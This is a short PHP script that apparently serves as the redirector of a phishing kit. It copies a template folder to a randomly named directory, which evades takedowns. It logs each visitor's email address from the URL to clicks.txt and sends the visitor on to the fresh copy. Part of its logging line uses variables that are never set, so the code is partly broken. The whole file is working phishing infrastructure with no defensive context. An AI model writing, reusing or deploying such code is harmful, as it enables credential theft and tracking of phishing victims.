<?php


setcookie("real", "OK");

$random = rand(0, 100000000000);
$md5    = md5("$random");
$base   = base64_encode($md5);
$dst    = md5("$base");

function dublicate($src, $dst)
{
    $dir = opendir($src);
    @mkdir($dst);
    while (false !== ($file = readdir($dir))) {
        if (($file != '.') && ($file != '..')) {
            if (is_dir($src . '/' . $file)) {
                dublicate($src . '/' . $file, $dst . '/' . $file);
            } else {
                copy($src . '/' . $file, $dst . '/' . $file);
            }
        }
    }
    closedir($dir);
}

$src = "def";
dublicate($src, ".".$dst);
$email = $_GET['email'];
@file_put_contents('clicks.txt',"$email - $ipei - $host - $ua\r\n",FILE_APPEND);

$rand = md5(uniqid(rand(), true));
exit(header("Location: .".$dst."/?".$rand.""));



?>
